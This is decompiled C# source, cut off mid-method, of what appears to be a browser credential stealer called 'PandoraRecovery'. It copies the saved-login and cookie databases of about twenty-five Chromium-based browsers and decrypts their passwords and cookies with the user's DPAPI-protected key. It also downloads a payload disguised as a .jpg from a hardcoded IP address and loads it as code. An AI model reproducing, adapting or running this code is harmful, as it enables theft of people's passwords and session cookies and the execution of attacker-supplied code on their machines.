using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace DLL.Functions
{
	// Token: 0x02000006 RID: 6
	internal class PandoraRecovery
	{
		// Token: 0x0600004F RID: 79 RVA: 0x00004A24 File Offset: 0x00002C24
		public static string GetRecovery()
		{
			string result;
			try
			{
				AppDomain.CurrentDomain.AssemblyResolve += PandoraRecovery.OnResolveAssembly;
				PandoraRecovery.SavedCandy.GetPasswds();
				PandoraRecovery.SavedCandy.GetCookies();
				result = PandoraRecovery.Collector.results;
			}
			catch (Exception ex)
			{
				result = ex.ToString();
			}
			return result;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004A74 File Offset: 0x00002C74
		private static Assembly OnResolveAssembly(object sender, ResolveEventArgs args)
		{
			Assembly result;
			try
			{
				result = Assembly.Load(PandoraRecovery.Copikolo.decompress(Convert.FromBase64String(PandoraRecovery.Pikolo.DePikoloData(new WebClient().DownloadString("http://51.254.27.112:1337/skra.jpg")))));
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0200001F RID: 31
		public class SQLiteHandler
		{
			// Token: 0x06000094 RID: 148 RVA: 0x00005BF8 File Offset: 0x00003DF8
			public SQLiteHandler(string baseName)
			{
				if (File.Exists(baseName))
				{
					this.db_bytes = File.ReadAllBytes(baseName);
					if (Encoding.Default.GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
					{
						throw new Exception("Not a valid SQLite 3 Database File");
					}
					if (this.db_bytes[52] != 0)
					{
						throw new Exception("Auto-vacuum capable database is not supported");
					}
					this.page_size = (ushort)this.ConvertToInteger(16, 2);
					this.encoding = this.ConvertToInteger(56, 4);
					if (decimal.Compare(new decimal(this.encoding), 0m) == 0)
					{
						this.encoding = 1UL;
					}
					this.ReadMasterTable(100UL);
				}
			}

			// Token: 0x06000095 RID: 149 RVA: 0x00005CD0 File Offset: 0x00003ED0
			private ulong ConvertToInteger(int startIndex, int Size)
			{
				if (Size > 8 | Size == 0)
				{
					return 0UL;
				}
				ulong num = 0UL;
				int num2 = Size - 1;
				for (int i = 0; i <= num2; i++)
				{
					num = (num << 8 | (ulong)this.db_bytes[startIndex + i]);
				}
				return num;
			}

			// Token: 0x06000096 RID: 150 RVA: 0x00005D10 File Offset: 0x00003F10
			private long CVL(int startIndex, int endIndex)
			{
				endIndex++;
				byte[] array = new byte[8];
				int num = endIndex - startIndex;
				bool flag = false;
				if (num == 0 | num > 9)
				{
					return 0L;
				}
				if (num == 1)
				{
					array[0] = (this.db_bytes[startIndex] & 127);
					return BitConverter.ToInt64(array, 0);
				}
				if (num == 9)
				{
					flag = true;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = this.db_bytes[endIndex - 1];
					endIndex--;
					num4 = 1;
				}
				for (int i = endIndex - 1; i >= startIndex; i += -1)
				{
					if (i - 1 >= startIndex)
					{
						array[num4] = (byte)(((int)((byte)(this.db_bytes[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(this.db_bytes[i - 1] << (num3 & 7))));
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)((int)((byte)(this.db_bytes[i] >> (num2 - 1 & 7))) & 255 >> num2);
					}
				}
				return BitConverter.ToInt64(array, 0);
			}

			// Token: 0x06000097 RID: 151 RVA: 0x00005E17 File Offset: 0x00004017
			public int GetRowCount()
			{
				return this.table_entries.Length;
			}

			// Token: 0x06000098 RID: 152 RVA: 0x00005E24 File Offset: 0x00004024
			public string[] GetTableNames()
			{
				List<string> list = new List<string>();
				int num = this.master_table_entries.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (this.master_table_entries[i].item_type == "table")
					{
						list.Add(this.master_table_entries[i].item_name);
					}
				}
				return list.ToArray();
			}

			// Token: 0x06000099 RID: 153 RVA: 0x00005E88 File Offset: 0x00004088
			public string GetValue(int row_num, int field)
			{
				if (row_num >= this.table_entries.Length)
				{
					return null;
				}
				if (field >= this.table_entries[row_num].content.Length)
				{
					return null;
				}
				return this.table_entries[row_num].content[field];
			}

			// Token: 0x0600009A RID: 154 RVA: 0x00005EC4 File Offset: 0x000040C4
			public string GetValue(int row_num, string field)
			{
				int num = -1;
				int num2 = this.field_names.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					return null;
				}
				return this.GetValue(row_num, num);
			}

			// Token: 0x0600009B RID: 155 RVA: 0x00005F18 File Offset: 0x00004118
			private int GVL(int startIndex)
			{
				if (startIndex > this.db_bytes.Length)
				{
					return 0;
				}
				int num = startIndex + 8;
				for (int i = startIndex; i <= num; i++)
				{
					if (i > this.db_bytes.Length - 1)
					{
						return 0;
					}
					if ((this.db_bytes[i] & 128) != 128)
					{
						return i;
					}
				}
				return startIndex + 8;
			}

			// Token: 0x0600009C RID: 156 RVA: 0x00005F6B File Offset: 0x0000416B
			private bool IsOdd(long value)
			{
				return (value & 1L) == 1L;
			}

			// Token: 0x0600009D RID: 157 RVA: 0x00005F78 File Offset: 0x00004178
			private void ReadMasterTable(ulong Offset)
			{
				if (this.db_bytes[(int)Offset] == 13)
				{
					ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					int num2 = 0;
					if (this.master_table_entries != null)
					{
						num2 = this.master_table_entries.Length;
						Array.Resize<PandoraRecovery.SQLiteHandler.sqlite_master_entry>(ref this.master_table_entries, this.master_table_entries.Length + (int)num + 1);
					}
					else
					{
						this.master_table_entries = new PandoraRecovery.SQLiteHandler.sqlite_master_entry[(int)(num + 1)];
					}
					int num3 = (int)num;
					for (int i = 0; i <= num3; i++)
					{
						ulong num4 = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
						if (decimal.Compare(new decimal(Offset), 100m) != 0)
						{
							num4 += Offset;
						}
						int num5 = this.GVL((int)num4);
						this.CVL((int)num4, num5);
						int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
						this.master_table_entries[num2 + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
						num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
						num5 = this.GVL((int)num4);
						num6 = num5;
						long value = this.CVL((int)num4, num5);
						long[] array = new long[5];
						int num7 = 0;
						do
						{
							num5 = num6 + 1;
							num6 = this.GVL(num5);
							array[num7] = this.CVL(num5, num6);
							if (array[num7] > 9L)
							{
								if (this.IsOdd(array[num7]))
								{
									array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
								}
								else
								{
									array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
								}
							}
							else
							{
								array[num7] = (long)((ulong)this.SQLDataTypeSize[(int)array[num7]]);
							}
							num7++;
						}
						while (num7 <= 4);
						if (decimal.Compare(new decimal(this.encoding), 1m) == 0)
						{
							this.master_table_entries[num2 + i].item_type = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						}
						else if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
						{
							this.master_table_entries[num2 + i].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						}
						else if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
						{
							this.master_table_entries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						}
						if (decimal.Compare(new decimal(this.encoding), 1m) == 0)
						{
							this.master_table_entries[num2 + i].item_name = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						}
						else if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
						{
							this.master_table_entries[num2 + i].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						}
						else if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
						{
							this.master_table_entries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						}
						this.master_table_entries[num2 + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
						if (decimal.Compare(new decimal(this.encoding), 1m) == 0)
						{
							this.master_table_entries[num2 + i].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						}
						else if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
						{
							this.master_table_entries[num2 + i].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						}
						else if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
						{
							this.master_table_entries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
						}
					}
					return;
				}
				if (this.db_bytes[(int)Offset] == 5)
				{
					int num8 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					for (int j = 0; j <= num8; j++)
					{
						ushort num9 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
						if (decimal.Compare(new decimal(Offset), 100m) == 0)
						{
							this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)num9, 4)), 1m), new decimal((int)this.page_size))));
						}
						else
						{
							this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + (ulong)num9), 4)), 1m), new decimal((int)this.page_size))));
						}
					}
					this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.page_size))));
				}
			}

			// Token: 0x0600009E RID: 158 RVA: 0x00006794 File Offset: 0x00004994
			public bool ReadTable(string TableName)
			{
				int num = -1;
				int num2 = this.master_table_entries.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					return false;
				}
				string[] array = this.master_table_entries[num].sql_statement.Substring(this.master_table_entries[num].sql_statement.IndexOf("(") + 1).Split(new char[]
				{
					','
				});
				int num3 = array.Length - 1;
				for (int j = 0; j <= num3; j++)
				{
					array[j] = array[j].TrimStart(new char[0]);
					int num4 = array[j].IndexOf(" ");
					if (num4 > 0)
					{
						array[j] = array[j].Substring(0, num4);
					}
					if (array[j].IndexOf("UNIQUE") == 0)
					{
						break;
					}
					Array.Resize<string>(ref this.field_names, j + 1);
					this.field_names[j] = array[j];
				}
				return this.ReadTableFromOffset((ulong)((this.master_table_entries[num].root_num - 1L) * (long)((ulong)this.page_size)));
			}

			// Token: 0x0600009F RID: 159 RVA: 0x000068D0 File Offset: 0x00004AD0
			private bool ReadTableFromOffset(ulong Offset)
			{
				if (this.db_bytes[(int)Offset] == 13)
				{
					int num = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					int num2 = 0;
					if (this.table_entries != null)
					{
						num2 = this.table_entries.Length;
						Array.Resize<PandoraRecovery.SQLiteHandler.table_entry>(ref this.table_entries, this.table_entries.Length + num + 1);
					}
					else
					{
						this.table_entries = new PandoraRecovery.SQLiteHandler.table_entry[num + 1];
					}
					int num3 = num;
					for (int i = 0; i <= num3; i++)
					{
						PandoraRecovery.SQLiteHandler.record_header_field[] array = new PandoraRecovery.SQLiteHandler.record_header_field[1];
						ulong num4 = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
						if (decimal.Compare(new decimal(Offset), 100m) != 0)
						{
							num4 += Offset;
						}
						int num5 = this.GVL((int)num4);
						this.CVL((int)num4, num5);
						int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
						this.table_entries[num2 + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
						num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
						num5 = this.GVL((int)num4);
						num6 = num5;
						long num7 = this.CVL((int)num4, num5);
						long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
						int num9 = 0;
						while (num8 < num7)
						{
							Array.Resize<PandoraRecovery.SQLiteHandler.record_header_field>(ref array, num9 + 1);
							num5 = num6 + 1;
							num6 = this.GVL(num5);
							array[num9].type = this.CVL(num5, num6);
							if (array[num9].type > 9L)
							{
								if (this.IsOdd(array[num9].type))
								{
									array[num9].size = (long)Math.Round((double)(array[num9].type - 13L) / 2.0);
								}
								else
								{
									array[num9].size = (long)Math.Round((double)(array[num9].type - 12L) / 2.0);
								}
							}
							else
							{
								array[num9].size = (long)((ulong)this.SQLDataTypeSize[(int)array[num9].type]);
							}
							num8 = num8 + (long)(num6 - num5) + 1L;
							num9++;
						}
						this.table_entries[num2 + i].content = new string[array.Length - 1 + 1];
						int num10 = 0;
						int num11 = array.Length - 1;
						for (int j = 0; j <= num11; j++)
						{
							if (array[j].type > 9L)
							{
								if (!this.IsOdd(array[j].type))
								{
									if (decimal.Compare(new decimal(this.encoding), 1m) == 0)
									{
										this.table_entries[num2 + i].content[j] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
									else if (decimal.Compare(new decimal(this.encoding), 2m) == 0)
									{
										this.table_entries[num2 + i].content[j] = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
									else if (decimal.Compare(new decimal(this.encoding), 3m) == 0)
									{
										this.table_entries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
								}
								else
								{
									this.table_entries[num2 + i].content[j] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
							}
							else
							{
								this.table_entries[num2 + i].content[j] = Convert.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size));
							}
							num10 += (int)array[j].size;
						}
					}
				}
				else if (this.db_bytes[(int)Offset] == 5)
				{
					int num12 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					for (int k = 0; k <= num12; k++)
					{
						ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
						this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + (ulong)num13), 4)), 1m), new decimal((int)this.page_size))));
					}
					this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.page_size))));
				}
				return true;
			}

			// Token: 0x04000072 RID: 114
			private byte[] db_bytes;

			// Token: 0x04000073 RID: 115
			private ulong encoding;

			// Token: 0x04000074 RID: 116
			private string[] field_names = new string[1];

			// Token: 0x04000075 RID: 117
			private PandoraRecovery.SQLiteHandler.sqlite_master_entry[] master_table_entries;

			// Token: 0x04000076 RID: 118
			private ushort page_size;

			// Token: 0x04000077 RID: 119
			private byte[] SQLDataTypeSize = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};

			// Token: 0x04000078 RID: 120
			private PandoraRecovery.SQLiteHandler.table_entry[] table_entries;

			// Token: 0x02000029 RID: 41
			private struct record_header_field
			{
				// Token: 0x04000088 RID: 136
				public long size;

				// Token: 0x04000089 RID: 137
				public long type;
			}

			// Token: 0x0200002A RID: 42
			private struct sqlite_master_entry
			{
				// Token: 0x0400008A RID: 138
				public long row_id;

				// Token: 0x0400008B RID: 139
				public string item_type;

				// Token: 0x0400008C RID: 140
				public string item_name;

				// Token: 0x0400008D RID: 141
				public string astable_name;

				// Token: 0x0400008E RID: 142
				public long root_num;

				// Token: 0x0400008F RID: 143
				public string sql_statement;
			}

			// Token: 0x0200002B RID: 43
			private struct table_entry
			{
				// Token: 0x04000090 RID: 144
				public long row_id;

				// Token: 0x04000091 RID: 145
				public string[] content;
			}
		}

		// Token: 0x02000020 RID: 32
		public class Collector
		{
			// Token: 0x04000079 RID: 121
			public static string results;
		}

		// Token: 0x02000021 RID: 33
		internal class Passwords
		{
			// Token: 0x060000A1 RID: 161 RVA: 0x00006F78 File Offset: 0x00005178
			public static List<string[]> get()
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
				string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
				string str3 = "\\User Data\\Default\\Login Data";
				string[] array = new string[]
				{
					str2 + "Google\\Chrome" + str3,
					str2 + "Google(x86)\\Chrome" + str3,
					str2 + "Chromium" + str3,
					str + "Opera software\\Opera Stable\\Login Data",
					str + "Opera software\\Opera GX Stable\\Login Data",
					str2 + "Bravesoftware\\Brave-Browser" + str3,
					str2 + "Epic Privacy Browser" + str3,
					str2 + "Amigo" + str3,
					str2 + "Vivaldi" + str3,
					str2 + "Orbitum" + str3,
					str2 + "Mail.Ru\\Atom" + str3,
					str2 + "Kometa" + str3,
					str2 + "Comodo\\Dragon" + str3,
					str2 + "Torch" + str3,
					str2 + "Comodo" + str3,
					str2 + "Slimjet" + str3,
					str2 + "360Browser\\Browser" + str3,
					str2 + "Maxthon3" + str3,
					str2 + "K-Melon" + str3,
					str2 + "Sputnik\\Sputnik" + str3,
					str2 + "Nichrome" + str3,
					str2 + "CocCoc\\Browser" + str3,
					str2 + "uCozMedia\\Uran" + str3,
					str2 + "Chromodo" + str3,
					str2 + "Yandex\\YandexBrowser" + str3
				};
				List<string[]> list = new List<string[]>();
				string text = "";
				foreach (string text2 in array)
				{
					if (File.Exists(text2))
					{
						string fullPath = Path.GetFullPath(Path.Combine(text2, "..\\..\\Local State"));
						if (!File.Exists(fullPath))
						{
							fullPath = Path.GetFullPath(Path.Combine(text2, "..\\Local State"));
						}
						text = Environment.GetEnvironmentVariable("temp") + "\\TMP_pass";
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(text2, text);
						File.SetAttributes(text, FileAttributes.Hidden);
						PandoraRecovery.ChromiumDecryptor chromiumDecryptor = new PandoraRecovery.ChromiumDecryptor(fullPath);
						PandoraRecovery.SQLiteHandler sqliteHandler = new PandoraRecovery.SQLiteHandler(text);
						sqliteHandler.ReadTable("logins");
						for (int j = 0; j < sqliteHandler.GetRowCount(); j++)
						{
							string value = sqliteHandler.GetValue(j, "origin_url");
							string value2 = sqliteHandler.GetValue(j, "username_value");
							string text3 = chromiumDecryptor.Decrypt(sqliteHandler.GetValue(j, "password_value"));
							string[] item = new string[]
							{
								value,
								value2,
								text3
							};
							if (!string.IsNullOrEmpty(text3))
							{
								list.Add(item);
							}
						}
					}
				}
				if (File.Exists(text))
				{
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				return list;
			}
		}

		// Token: 0x02000022 RID: 34
		internal class Cookies
		{
			// Token: 0x060000A3 RID: 163 RVA: 0x000072A8 File Offset: 0x000054A8
			public static List<string[]> get()
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
				string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
				string str3 = "\\User Data\\Default\\Cookies";
				string[] array = new string[]
				{
					str2 + "Google\\Chrome" + str3,
					str2 + "Google(x86)\\Chrome" + str3,
					str2 + "Chromium" + str3,
					str + "Opera software\\Opera Stable\\Cookies",
					str + "Opera software\\Opera GX Stable\\Cookies",
					str2 + "Bravesoftware\\Brave-Browser" + str3,
					str2 + "Epic Privacy Browser" + str3,
					str2 + "Amigo" + str3,
					str2 + "Vivaldi" + str3,
					str2 + "Orbitum" + str3,
					str2 + "Mail.Ru\\Atom" + str3,
					str2 + "Kometa" + str3,
					str2 + "Comodo\\Dragon" + str3,
					str2 + "Torch" + str3,
					str2 + "Comodo" + str3,
					str2 + "Slimjet" + str3,
					str2 + "360Browser\\Browser" + str3,
					str2 + "Maxthon3" + str3,
					str2 + "K-Melon" + str3,
					str2 + "Sputnik\\Sputnik" + str3,
					str2 + "Nichrome" + str3,
					str2 + "CocCoc\\Browser" + str3,
					str2 + "uCozMedia\\Uran" + str3,
					str2 + "Chromodo" + str3,
					str2 + "Yandex\\YandexBrowser" + str3
				};
				List<string[]> list = new List<string[]>();
				string text = "";
				foreach (string text2 in array)
				{
					if (File.Exists(text2))
					{
						string fullPath = Path.GetFullPath(Path.Combine(text2, "..\\..\\Local State"));
						if (!File.Exists(fullPath))
						{
							fullPath = Path.GetFullPath(Path.Combine(text2, "..\\Local State"));
						}
						text = Environment.GetEnvironmentVariable("temp") + "\\TMP_Cookies";
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(text2, text);
						File.SetAttributes(text, FileAttributes.Hidden);
						PandoraRecovery.ChromiumDecryptor chromiumDecryptor = new PandoraRecovery.ChromiumDecryptor(fullPath);
						PandoraRecovery.SQLiteHandler sqliteHandler = new PandoraRecovery.SQLiteHandler(text);
						sqliteHandler.ReadTable("cookies");
						for (int j = 0; j < sqliteHandler.GetRowCount(); j++)
						{
							string text3 = chromiumDecryptor.Decrypt(sqliteHandler.GetValue(j, "encrypted_value"));
							string value = sqliteHandler.GetValue(j, "host_key");
							string value2 = sqliteHandler.GetValue(j, "name");
							string value3 = sqliteHandler.GetValue(j, "path");
							string text4 = Convert.ToString(sqliteHandler.GetValue(j, "is_secured"));
							string[] item = new string[]
							{
								text3,
								value,
								value2,
								value3,
								text4
							};
							if (!string.IsNullOrEmpty(value2))
							{
								list.Add(item);
							}
						}
					}
				}
				if (File.Exists(text))
				{
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				return list;
			}
		}

		// Token: 0x02000023 RID: 35
		public class NameOf
		{
			// Token: 0x060000A5 RID: 165 RVA: 0x0000760C File Offset: 0x0000580C
			public static string nameof<T>(Expression<Func<T>> name)
			{
				return ((MemberExpression)name.Body).Member.Name;
			}
		}

		// Token: 0x02000024 RID: 36
		public class ChromiumDecryptor
		{
			// Token: 0x060000A7 RID: 167 RVA: 0x0000762C File Offset: 0x0000582C
			public ChromiumDecryptor(string localStatePath)
			{
				try
				{
					if (File.Exists(localStatePath))
					{
						string text = File.ReadAllText(localStatePath);
						int startIndex = text.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
						string s = text.Substring(startIndex).Substring(0, text.Substring(startIndex).IndexOf('"'));
						this._key = ProtectedData.Unprotect(Convert.FromBase64String(s).Skip(5).ToArray<byte>(), null, DataProtectionScope.CurrentUser);
					}
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x060000A8 RID: 168 RVA: 0x000076B8 File Offset: 0x000058B8
			public static string toUTF8(string text)
			{
				Encoding encoding = Encoding.GetEncoding("UTF-8");
				Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
				byte[] bytes = encoding2.GetBytes(text);
				byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
				return encoding2.GetString(bytes2);
			}

			// Token: 0x060000A9 RID: 169 RVA: 0x000076F4 File Offset: 0x000058F4
			public string Decrypt(string cipherText)
			{
				byte[] bytes = Encoding.Default.GetBytes(cipherText);
				if (cipherText.StartsWith("v10") && this._key != null)
				{
					return Encoding.UTF8.GetString(this.DecryptAesGcm(bytes, this._key, 3));
				}
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(bytes, null, DataProtectionScope.CurrentUser));
			}

			// Token: 0x060000AA RID: 170 RVA: 0x00007750 File Offset: 0x00005950
			private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
			{
				if (key == null || key.Length != 32)
				{
					throw new ArgumentException(string.Format("Key needs to be {0} bit!", 256), "key");
				}
				if (message == null || message.Length == 0)
				{
					throw new ArgumentException("Message required!", "message");
				}
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(message))
				{
					using (BinaryReader binaryReader = new BinaryReader(memoryStream))
					{
						binaryReader.ReadBytes(nonSecretPayloadLength);
						byte[] array = binaryReader.ReadBytes(12);
						GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
						AeadParameters aeadParameters = new AeadParameters(new KeyParameter(key), 128, array);
						gcmBlockCipher.Init(false, aeadParameters);
						byte[] array2 = binaryReader.ReadBytes(message.Length);
						byte[] array3 = new byte[gcmBlockCipher.GetOutputSize(array2.Length)];
						try
						{
							int num = gcmBlockCipher.ProcessBytes(array2, 0, array2.Length, array3, 0);
							gcmBlockCipher.DoFinal(array3, num);
						}
						catch (InvalidCipherTextException)
						{
							return null;
						}
						result = array3;
					}
				}
				return result;
			}

			// Token: 0x0400007A RID: 122
			private readonly byte[] _key;
		}

		// Token: 0x02000025 RID: 37
		public class SavedCandy
		{
			// Token: 0x060000AB RID: 171 RVA: 0x00007868 File Offset: 0x00005A68
			public static void GetPasswds()
			{
				PandoraRecovery.Collector.results = PandoraRecovery.Collector.results + "==[Chrome Passwords]==" + Environment.NewLine;
				foreach (string[] array in PandoraRecovery.Passwords.get())
				{
					PandoraRecovery.Collector.results = string.Concat(new string[]
					{
						PandoraRecovery.Collector.results,
						"\n\n[PASSWORD]\nHostname: ",
						array[0],
						"\nUsername: ",
						array[1],
						"\nPassword: ",
						array[2],
						"\n"
					});
				}
			}

			// Token: 0x060000AC RID: 172 RVA: 0x00007918 File Offset: 0x00005B18
			public static void GetCookies()
			{
				PandoraRecovery.Collector.results = PandoraRecovery.Collector.results + "==[Chrome Passwords]==" + Environment.NewLine;
				foreach (string[] array in PandoraRecovery.Cookies.get())
				{
					PandoraRecovery.Collector.results = string.Concat(new string[]
					{
						PandoraRecovery.Collector.results,
						"\n\n[COOKIE]\nValue: ",
						array[0],
						"\nHostKey: ",
						array[1],
						"\nName: ",
						array[2],
						"\nPath: ",
						array[3],
						"\nisSecure: ",
						array[4],
						"\n"
					});
				}
			}
		}

		// Token: 0x02000026 RID: 38
		public static class Copikolo
		{
			// Token: 0x060000AE RID: 174 RVA: 0x000079F0 File Offset: 0x00005BF0
			private static int headerLen(byte[] source)
			{
				if ((source[0] & 2) != 2)
				{
					return 3;
				}
				return 9;
			}

			// Token: 0x060000AF RID: 175 RVA: 0x000079FE File Offset: 0x00005BFE
			public static int sizeDecompressed(byte[] source)
			{
				if (PandoraRecovery.Copikolo.headerLen(source) == 9)
				{
					return (int)source[5] | (int)source[6] << 8 | (int)source[7] << 16 | (int)source[8] << 24;
				}
				return (int)source[2];
			}

			// Token: 0x060000B0 RID: 176 RVA: 0x00007A25 File Offset: 0x00005C25
			public static int sizeCompressed(byte[] source)
			{
				if (PandoraRecovery.Copikolo.headerLen(source) == 9)
				{
					return (int)source[1] | (int)source[2] << 8 | (int)source[3] << 16 | (int)source[4] << 24;
				}
				return (int)source[1];
			}

			// Token: 0x060000B1 RID: 177 RVA: 0x00007A4C File Offset: 0x00005C4C
			private static void write_header(byte[] dst, int level, bool compressible, int size_compressed, int size_decompressed)
			{
